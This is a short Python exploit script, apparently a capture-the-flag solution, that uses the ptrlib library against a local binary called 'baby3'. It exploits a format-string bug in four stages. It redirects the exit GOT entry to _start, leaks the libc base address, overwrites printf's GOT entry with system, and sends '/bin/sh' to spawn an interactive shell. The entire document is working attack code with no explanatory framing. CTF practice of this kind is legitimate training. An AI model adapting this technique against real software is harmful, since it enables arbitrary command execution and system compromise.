from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./baby3")
sock = Process("./baby3")
delta = 0xe7

# Stage 1: exit-->_start
payload = fsb(
    pos = 6,
    writes = {elf.got("exit"): elf.symbol("_start") & 0xffff},
    bs = 2,
    size = 2,
    bits = 64
)
print(payload)
sock.recvuntil("input: ")
sock.sendline(payload)

# Stage 2: leak libc base
sock.recvuntil("input: ")
sock.sendline("%25$p")
addr_libc_start_main = int(sock.recvline(), 16)
libc_base = addr_libc_start_main - libc.symbol("__libc_start_main") - delta
logger.info("libc base = " + hex(libc_base))

# Stage 3: printf-->system
payload = fsb(
    pos = 6,
    writes = {elf.got("printf"): libc_base + libc.symbol("system")},
    bs = 2,
    size = 8,
    bits = 64
)
sock.recvuntil("input: ")
sock.sendline(payload)

# Stage 4: get the shell!
sock.sendline("/bin/sh\x00")

sock.interactive()
